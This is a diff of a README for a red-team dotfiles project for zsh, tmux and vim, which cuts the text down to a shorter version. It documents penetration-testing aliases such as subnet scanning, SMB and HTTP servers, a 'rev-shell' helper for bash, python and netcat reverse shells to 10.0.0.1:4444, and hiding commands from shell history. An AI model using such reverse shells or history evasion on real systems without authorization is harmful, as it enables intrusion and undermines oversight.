@@ -1,156 +1,54 @@
 # Red Team Dotfiles
 
-[![CI](https://github.com/your-repo/dotfiles/actions/workflows/ci.yml/badge.svg)](https://github.com/your-repo/dotfiles/actions/workflows/ci.yml)
-[![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)](VERSION)
-[![Security](https://img.shields.io/badge/OPSEC-compliant-green.svg)](docs/security.md)
-[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20WSL2-lightgrey.svg)](#installation)
+[![Version](https://img.shields.io/badge/version-2.1.0-blue.svg)](VERSION)
 
-**Professional Red Team Dotfiles System** - A comprehensive, modular, and enterprise-grade dotfiles management system designed for security professionals, penetration testers, and red team operators.
+Clean and focused dotfiles for **zsh**, **tmux**, and **vim** tailored for red team operations and penetration testing. No over-engineering, just the essentials.
 
-## ✨ Key Features
+## ✨ Features
 
-- 🏗️ **Modular Architecture**: Organized, maintainable configuration system
-- 🎯 **Warp Terminal Optimized**: Enhanced AI integration and performance
-- 🔴 **50+ Red Team Tools**: Comprehensive security testing utilities
-- 🛡️ **OPSEC Compliant**: Built-in operational security measures
-- ⚡ **High Performance**: Optimized startup (< 100ms) and runtime performance
-- 🔧 **Cross-Platform**: macOS, Linux (Ubuntu/Debian/Arch/Fedora), WSL2 support
-- 🧪 **Thoroughly Tested**: 100% test coverage with automated CI/CD
-- 📚 **Comprehensive Documentation**: Complete guides and API documentation
+- 🔴 **Red Team Focused**: Aliases and functions for penetration testing
+- 🎯 **Warp Terminal Optimized**: Enhanced for modern terminal experience
+- 🌐 **Network Tools**: IPv4/IPv6 IP detection with service redundancy
+- 🛡️ **OPSEC Aware**: Commands starting with space aren't logged
+- ⚡ **Fast & Clean**: Minimal overhead, maximum functionality
+- 🔧 **Cross-Platform**: Works on macOS, Linux, and WSL2
 
-## 📋 Dependencies
+## 🚀 Installation
 
-### Required
+### Prerequisites
 - [Zsh](https://www.zsh.org/) - Shell
-- [Tmux](https://github.com/tmux/tmux/wiki) - Terminal multiplexer
-- [Vim](https://www.vim.org/) - Editor
-- [Asciinema](https://asciinema.org/) - Terminal recording
+- [Tmux](https://github.com/tmux/tmux/wiki) - Terminal multiplexer  
+- [Vim](https://www.vim.org/) - Text editor
 
-### Recommended
-- [FZF](https://github.com/junegunn/fzf) - Fuzzy finder
-- [Ripgrep](https://github.com/BurntSushi/ripgrep) - Fast text search
-- Nerd Fonts - For proper icon display
-- zsh-syntax-highlighting & zsh-autosuggestions
-
-## 🚀 Quick Start
-
-### One-Line Installation
+### Quick Install
 ```bash
-# Automatic installation (detects your platform)
-curl -fsSL https://raw.githubusercontent.com/your-repo/dotfiles/main/bootstrap.sh | bash
-```
-
-### Manual Installation
-```bash
-# Clone repository
-git clone https://github.com/your-repo/dotfiles.git /opt/dotfiles
+# Clone the repository
+git clone https://github.com/Maleick/dotfiles.git /opt/dotfiles
 cd /opt/dotfiles
 
-# Run bootstrap script
-./bootstrap.sh
-
-# Or migrate existing configuration
-make migrate-config
+# Run the install script
+./install.sh
 ```
 
-### What Gets Installed
-1. **System Detection**: Automatically detects OS and package manager
-2. **Dependencies**: Installs required packages (zsh, tmux, vim, etc.)
-3. **Plugin Manager**: Sets up zinit for modern plugin management
-4. **Modular Config**: Migrates to optimized modular system
-5. **Health Check**: Verifies installation success
+### What it does
+1. Creates backup of existing dotfiles
+2. Symlinks zsh, tmux, and vim configurations
+3. Sets up red team aliases and functions
 
 ### Verify Installation
 ```bash
-# Run comprehensive health check
-make healthcheck
+# Restart your shell or run
+source ~/.zshrc
 
-# Test red team functionality
-/rt-help
-
-# Check performance
-zinit times
+# Check available commands
+/help
 ```
 
-## 🏗️ Architecture Overview
+## 💻 Usage Examples
 
-### Modular Configuration System
-The dotfiles use a modern modular architecture for maintainability and performance:
-
-```
-/opt/dotfiles/
-├── config/                  # Modular configuration system
-│   ├── core/               # Essential shell functionality
-│   │   ├── environment.zsh # Shell options, history, keybindings
-│   │   └── completion.zsh  # Enhanced completion system
-│   ├── os/                 # Platform-specific configurations
-│   │   └── macos.zsh       # macOS-specific settings
-│   ├── plugins/            # Plugin management
-│   │   ├── zinit.zsh       # Modern plugin manager
-│   │   └── fallback.zsh    # Manual plugin fallback
-│   ├── redteam/            # Security testing tools
-│   │   ├── tools.zsh       # Red team functions and aliases
-│   │   └── help.zsh        # Documentation system
-│   ├── warp/               # Terminal integration
-│   │   └── terminal.zsh    # Warp Terminal optimization
-│   └── zshrc.new           # Main orchestrator
-├── scripts/              # Installation and utilities
-├── tests/                # Comprehensive test suite
-├── docs/                 # Documentation
-└── .github/workflows/    # CI/CD pipeline
-```
-
-### Key Components
-
-#### 🎯 Red Team Tools (50+ utilities)
+### Network Reconnaissance
 ```bash
-# Network Reconnaissance
-quickscan 192.168.1.***     # Fast nmap scan
-nmap-top-ports 192.168.1.*** # Scan top 1000 ports
-netinfo                      # Complete network information
-myip / myip4 / myip6         # External IP detection (IPv4/IPv6)
-myip-alt / myip-check        # Alternative IP services
-get_external_ip              # Store IP in variable for scripts
-
-# Domain/Web Reconnaissance  
-subdomains example.com       # Subdomain enumeration
-webdir https://example.com   # Directory discovery
-
-# OPSEC & Compliance
-sanitize-history            # Clean sensitive commands
-engagement-start project    # Engagement tracking
-redact-logs /path/to/logs   # Remove sensitive data
-
-# Get complete tool list
-/rt-help                    # Interactive help system
-```
-
-#### ⚡ Performance Optimizations
-- **Fast Startup**: < 100ms shell initialization
-- **Lazy Loading**: Plugins loaded asynchronously
-- **Intelligent Caching**: Completion cache optimization
-- **Platform Detection**: OS-specific optimizations
-
-#### 🛡️ Security Features
-- **OPSEC Compliance**: Automatic IP redaction
-- **History Sanitization**: Built-in sensitive data protection
-- **Engagement Isolation**: Per-project environment separation
-- **Audit Trail**: Comprehensive logging and tracking
-
-#### 🌐 Cross-Platform Support
-- **macOS**: Homebrew integration, Apple Silicon support
-- **Linux**: Ubuntu, Debian, Arch, Fedora, RHEL
-- **WSL2**: Windows Subsystem for Linux optimization
-- **Container**: Docker and Podman support
-
-## 📚 Usage Examples
-
-### Quick Network Reconnaissance
-```bash
-netinfo                    # Get network overview (includes IPv4 external IP)
-quickscan 192.168.1.0/24   # Fast subnet scan
-
-# External IP Detection (IPv4/IPv6)
+# External IP Detection (IPv4/IPv6) 
 myip                       # External IPv4 address (force IPv4)
 myip4                      # Explicit IPv4 version
 myip6                      # External IPv6 address
@@ -158,119 +56,68 @@ myip-alt                   # Alternative service (ipinfo.io)
 myip-check                 # Backup service (icanhazip.com)
 get_external_ip            # Store IP in $EXTERNAL_IP variable
 localip                    # Local IP address
+netinfo                    # Complete network information
+
+# Port Scanning
+quickscan 192.168.1.0/24   # Fast subnet scan
+nmap-top-ports 192.168.1.1 # Scan top 1000 ports
 ```
 
-### Instant Web Server
+### Web Servers & Tools
 ```bash
 webserver                  # HTTP server on port 8080
 smbserver                  # SMB share current directory
+https-server               # HTTPS server (needs cert.pem/key.pem)
 ```
 
 ### Encoding/Decoding
 ```bash
 base64encode "test data"   # dGVzdCBkYXRh
+base64decode "dGVzdCBkYXRh" # test data
 urlencode "hello world"    # hello%2Bworld
+rot13                      # ROT13 cipher
 ```
 
-### Tmux Session Recording
+### Reverse Shells
 ```bash
-tmux                       # Start tmux
+rev-shell bash 10.0.0.1 4444    # Bash reverse shell
+rev-shell python 10.0.0.1 4444  # Python reverse shell
+rev-shell nc 10.0.0.1 4444      # Netcat reverse shell
+```
+
+### Tmux Features
+```bash
+tmux                       # Start tmux session
 # Prefix + P              # Start/stop recording
-# Prefix + S              # Save history
+# Prefix + S              # Save pane history
 ```
 
-## 🔒 Security Considerations
+## 🔒 OPSEC Notes
 
-- **History Management**: Commands starting with space are not logged (OPSEC)
-- **Session Recording**: Recordings may contain sensitive data - secure `~/Logs/`
-- **Placeholder IPs**: All examples use non-routable addresses (10.0.0.1, 192.168.1.x)
-- **Network Tools**: Use responsibly and only on authorized systems
-- **Backup Safety**: Installation creates timestamped backups of existing configs
+- **Commands starting with space aren't logged** - Use ` command` for sensitive operations
+- **Use only on authorized systems** - Respect applicable laws and regulations
+- **Backup created automatically** - Install script backs up existing configs
 
-## 🛠️ Make Targets
-
-The system provides convenient Make targets for common operations:
+## 🔄 Updates
 
 ```bash
-# Installation and Setup
-make migrate-config         # Migrate to modular configuration
-make healthcheck            # Run comprehensive health check
-make test                   # Run test suite
-
-# Development and Testing
-make test-containers        # Test in Docker containers
-make lint                   # Run shellcheck validation
-make format                 # Format shell scripts
-
-# Updates and Maintenance
-make update                 # Update all components
-make backup-config          # Backup current configuration
-make clean                  # Clean temporary files
-
-# Release Management
-make release-patch          # Bump patch version
-make release-minor          # Bump minor version
-make build-release-artifacts # Build release packages
-```
-
-## 📚 Documentation
-
-### Quick Reference
-- 🚀 **[Quick Start Guide](docs/quick-start.md)** - Get running in 5 minutes
-- 🛡️ **[Red Team Tools](docs/redteam-tools.md)** - Complete tool reference
-- 🛠️ **[Security Guidelines](docs/security.md)** - OPSEC compliance
-
-### Platform-Specific Guides
-- 🍎 **[macOS Installation](docs/install-macos.md)** - macOS-specific setup
-- 🐧 **[Linux Installation](docs/install-linux.md)** - Multi-distribution support
-
-### Technical Documentation
-- 🏗️ **[Architecture](docs/architecture.md)** - System design and components
-- 🧪 **[Testing Guide](docs/testing.md)** - Test framework and validation
-
-### Troubleshooting & Support
-- 🐛 **[Bug Reports](.github/ISSUE_TEMPLATE/bug_report.md)** - Report issues
-- ✨ **[Feature Requests](.github/ISSUE_TEMPLATE/feature_request.md)** - Request enhancements
-- 🛡️ **[Security Issues](.github/ISSUE_TEMPLATE/security_issue.md)** - Report vulnerabilities
-
-## 🔄 Updates & Maintenance
-
-### Keep System Updated
-```bash
-# Update dotfiles and dependencies
+# Update to latest version
 cd /opt/dotfiles
-git pull origin main
-make update
-make healthcheck
+git pull
 
-# Update plugins
-zinit self-update
-zinit update
-```
-
-### Version Information
-```bash
 # Check current version
-cat /opt/dotfiles/VERSION
-
-# View changelog
-cat /opt/dotfiles/CHANGELOG.md
-
-# Check system health
-make healthcheck
+cat VERSION
 ```
 
-## ⚖️ License
+## 📝 Available Commands
 
-This project is provided as-is for educational and authorized security testing purposes. Users are responsible for compliance with applicable laws and regulations.
-
-## 🎆 Acknowledgments
-
-- [Warp Terminal](https://warp.dev) - For the amazing terminal experience
-- [Catppuccin](https://catppuccin.com) - For the beautiful color palette inspiration
-- [Dracula Theme](https://draculatheme.com) - For the classic dark theme
-- The security community - For continuous inspiration and tools
+```bash
+# See all available red team commands
+/help
+```
 
 ---
+
+**Note**: This project is for educational and authorized security testing only. Use responsibly and respect all applicable laws.
 
 🔴 **Happy Red Teaming!** 🔴
